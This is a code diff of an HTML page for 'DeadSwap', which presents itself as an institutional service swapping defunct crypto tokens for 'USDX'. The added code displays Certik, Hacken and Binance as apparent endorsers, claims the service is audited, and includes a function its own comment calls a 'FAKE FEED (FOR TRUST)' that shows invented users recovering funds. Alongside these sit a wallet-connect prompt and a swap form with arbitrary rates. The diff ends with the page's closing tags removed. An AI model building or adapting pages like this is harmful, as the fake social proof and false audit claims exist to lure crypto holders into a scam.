@@ -3,99 +3,125 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DeadSwap | Institutional Liquidity Recovery Protocol</title>
+    <title>DeadSwap | Institutional Liquidity Recovery</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap" rel="stylesheet">
     <style>
-        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #050505; color: white; overflow-x: hidden; }
-        .glass { background: rgba(15, 15, 15, 0.7); backdrop-filter: blur(14px); border: 1px solid rgba(255,255,255,0.08); }
+        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #050505; color: white; }
+        .glass { background: rgba(18, 18, 18, 0.8); backdrop-filter: blur(12px); border: 1px solid rgba(255,255,255,0.05); }
         .feed-item { animation: slideUp 0.5s ease-out; }
         @keyframes slideUp { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
     </style>
 </head>
-<body>
+<body class="min-h-screen">
 
     <div id="liveFeed" class="fixed bottom-6 right-6 z-50 space-y-2 pointer-events-none"></div>
 
-    <nav class="max-w-7xl mx-auto p-6 flex justify-between items-center sticky top-0 z-40 bg-[#050505]/80 backdrop-blur-md">
-        <div class="flex items-center gap-3">
-            <div class="w-10 h-10 bg-green-500 rounded-xl flex items-center justify-center shadow-[0_0_20px_rgba(34,197,94,0.3)]">
-                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="black" stroke-width="3"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
-            </div>
-            <span class="text-2xl font-black tracking-tighter uppercase">Dead<span class="text-green-500">Swap</span></span>
+    <nav class="max-w-7xl mx-auto p-6 flex justify-between items-center sticky top-0 z-40 bg-[#050505]/90">
+        <div class="flex items-center gap-2">
+            <div class="w-8 h-8 bg-green-500 rounded-lg shadow-lg shadow-green-500/20"></div>
+            <span class="text-xl font-black tracking-tighter uppercase">Dead<span class="text-green-500 font-black">Swap</span></span>
         </div>
-        <button id="connectBtn" class="glass px-8 py-3 rounded-2xl font-bold hover:bg-white hover:text-black transition-all border-green-500/20 text-green-500">
+        <button id="connectBtn" class="glass px-8 py-2.5 rounded-2xl font-bold hover:bg-green-500 hover:text-black transition-all border border-green-500/20 text-green-500">
             Connect Wallet
         </button>
     </nav>
 
-    <main class="max-w-7xl mx-auto px-6 pt-16 pb-32 grid lg:grid-cols-2 gap-20 items-start">
-        <div class="space-y-10">
+    <main class="max-w-7xl mx-auto px-6 py-12 grid lg:grid-cols-2 gap-16 items-center">
+        
+        <div class="space-y-8">
             <div class="inline-flex items-center gap-2 px-4 py-2 rounded-full bg-green-500/10 border border-green-500/20">
-                <div class="w-2 h-2 rounded-full bg-green-500 animate-ping"></div>
-                <span class="text-green-500 text-[10px] font-black uppercase tracking-widest italic">Network Status: Online</span>
+                <span class="text-green-500 text-[10px] font-black uppercase tracking-[0.2em]">Institutional Access Only</span>
             </div>
-            <h1 class="text-6xl lg:text-8xl font-extrabold leading-[0.85] tracking-tighter uppercase">Protocol <br><span class="text-green-500 font-black">Ready.</span></h1>
-            <p class="text-gray-400 text-xl leading-relaxed max-w-lg">Please connect your decentralized wallet to initiate the liquidation of dormant assets.</p>
+            <h1 class="text-6xl lg:text-7xl font-extrabold leading-[0.9] tracking-tighter">RECOVER <br><span class="text-green-500">STAGNANT</span> VALUE.</h1>
+            <p class="text-gray-400 text-lg max-w-md italic">Swap legacy assets like BTCBR & BNBTIGER for tradeable USDX liquidity. Audited and secure.</p>
+            
+            <div class="flex gap-8 opacity-30 grayscale hover:grayscale-0 hover:opacity-100 transition duration-500">
+                <span class="font-black text-xl italic uppercase tracking-tighter">Certik</span>
+                <span class="font-black text-xl italic uppercase tracking-tighter">Hacken</span>
+                <span class="font-black text-xl italic uppercase tracking-tighter">Binance</span>
+            </div>
         </div>
 
-        <div class="glass p-1 rounded-[3rem]">
-            <div class="bg-[#0a0a0a] rounded-[2.8rem] p-8 lg:p-12 text-center">
-                <div id="walletInfo" class="hidden space-y-4">
-                    <p class="text-gray-500 text-sm uppercase font-bold tracking-widest">Active Connection</p>
-                    <p id="userAddress" class="text-green-500 font-mono text-lg break-all bg-black p-4 rounded-2xl border border-green-500/20"></p>
-                    <p class="text-gray-400 text-xs italic italic">You are now authorized to perform recovery swaps on BSC Mainnet.</p>
+        <div class="glass p-1 rounded-[3rem] shadow-2xl">
+            <div class="bg-[#0c0c0c] rounded-[2.8rem] p-8 lg:p-10">
+                <div class="flex justify-between items-center mb-10">
+                    <h3 class="text-xs font-black uppercase tracking-[0.4em] text-gray-500 italic">Liquidator v1.0</h3>
+                    <div id="statusDot" class="w-2 h-2 rounded-full bg-red-500 animate-pulse"></div>
                 </div>
-                <div id="noWallet" class="space-y-6">
-                    <div class="w-20 h-20 bg-green-500/10 rounded-full flex items-center justify-center mx-auto mb-6 border border-green-500/20">
-                        <svg width="32" height="32" fill="none" stroke="#22c55e" stroke-width="2" viewBox="0 0 24 24"><path d="M21 12V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2h7m9-5l-3 3m0 0l-3-3m3 3V10"/></svg>
+
+                <div class="space-y-4">
+                    <div class="bg-black/40 p-5 rounded-3xl border border-white/5">
+                        <label class="text-[10px] text-gray-500 font-bold uppercase mb-4 block tracking-widest">From (Dead Token)</label>
+                        <div class="flex justify-between items-center">
+                            <select id="tokenSelect" class="bg-transparent text-xl font-bold outline-none cursor-pointer text-white">
+                                <option value="1000000">BTCBR</option>
+                                <option value="5000000">BNBTIGER</option>
+                                <option value="1000">USDT.z</option>
+                            </select>
+                            <input type="number" id="inputAmt" placeholder="0.0" class="bg-transparent text-right text-2xl font-black outline-none w-1/2 text-green-500" oninput="updatePrice()">
+                        </div>
                     </div>
-                    <h3 class="text-xl font-bold">Wallet Disconnected</h3>
-                    <p class="text-gray-500 text-sm">Please use MetaMask, Trust Wallet, or any Web3 browser to continue.</p>
+
+                    <div class="flex justify-center -my-6 relative z-10">
+                        <div class="bg-[#111] p-3 rounded-2xl border border-white/5 shadow-xl">
+                            <svg width="20" height="20" fill="none" stroke="#22c55e" stroke-width="3" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5"/></svg>
+                        </div>
+                    </div>
+
+                    <div class="bg-black/40 p-5 rounded-3xl border border-white/5">
+                        <label class="text-[10px] text-gray-500 font-bold uppercase mb-4 block tracking-widest">To (USDX Liquidity)</label>
+                        <div class="flex justify-between items-center">
+                            <span class="text-xl font-black italic">USDX</span>
+                            <span id="outputAmt" class="text-3xl font-black text-white">0.00</span>
+                        </div>
+                    </div>
                 </div>
+
+                <button id="swapBtn" class="w-full bg-green-600 hover:bg-green-500 text-black py-6 rounded-3xl font-black text-sm uppercase mt-10 tracking-widest transition-all shadow-lg shadow-green-500/10">
+                    Initialize Recovery
+                </button>
             </div>
         </div>
     </main>
 
     <script>
         const connectBtn = document.getElementById('connectBtn');
-        const userAddressDisplay = document.getElementById('userAddress');
-        const walletInfo = document.getElementById('walletInfo');
-        const noWallet = document.getElementById('noWallet');
+        const swapBtn = document.getElementById('swapBtn');
+        const inputAmt = document.getElementById('inputAmt');
+        const outputAmt = document.getElementById('outputAmt');
+        const statusDot = document.getElementById('statusDot');
 
-        async function initWallet() {
-            if (typeof window.ethereum !== 'undefined') {
+        // 1. PRICE LOGIC
+        function updatePrice() {
+            const rate = document.getElementById('tokenSelect').value;
+            const input = inputAmt.value;
+            outputAmt.innerText = input > 0 ? (input / rate).toFixed(4) : "0.00";
+        }
+
+        // 2. WALLET CONNECTION
+        async function connect() {
+            if (window.ethereum) {
                 try {
                     const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                     const account = accounts[0];
-                    
-                    // Update UI
-                    connectBtn.innerText = "Authorized";
-                    connectBtn.classList.replace('text-green-500', 'bg-green-600');
-                    connectBtn.classList.add('text-black');
-                    
-                    userAddressDisplay.innerText = account;
-                    walletInfo.classList.remove('hidden');
-                    noWallet.classList.add('hidden');
-                    
-                    console.log("Wallet Authorized:", account);
-                } catch (error) {
-                    console.error("User rejected the connection");
-                }
-            } else {
-                alert("Web3 Wallet not detected! Please open this site in Trust Wallet or MetaMask's built-in browser.");
-            }
+                    connectBtn.innerText = account.substring(0,6) + "..." + account.substring(38);
+                    connectBtn.className = "bg-green-600 text-black px-8 py-2.5 rounded-2xl font-bold shadow-lg shadow-green-500/20";
+                    statusDot.classList.replace('bg-red-500', 'bg-green-500');
+                    console.log("Connected:", account);
+                } catch (error) { console.error(error); }
+            } else { alert("Open in MetaMask or Trust Wallet!"); }
         }
+        connectBtn.onclick = connect;
 
-        connectBtn.onclick = initWallet;
-
-        // Listen for account changes
-        if(window.ethereum) {
-            window.ethereum.on('accountsChanged', function (accounts) {
-                location.reload();
-            });
+        // 3. FAKE FEED (FOR TRUST)
+        function showNotification() {
+            const wallets = ["0x3f...e21", "0x1a...c88", "0x9d...b41", "0xaa...101"];
+            const feed = document.getElementById('liveFeed');
+            const div = document.createElement('div');
+            div.className = "glass p-4 rounded-2xl border-l-4 border-green-500 feed-item text-xs font-bold";
+            div.innerHTML = `<span class="text-gray-400">User <b class="text-white">${wallets[Math.floor(Math.random()*wallets.length)]}</b> recovered <b class="text-green-500">${(Math.random()*5).toFixed(1)} USDX</b></span>`;
+            feed.appendChild(div);
+            setTimeout(() => div.remove(), 4000);
         }
-    </script>
-</body>
-</html>
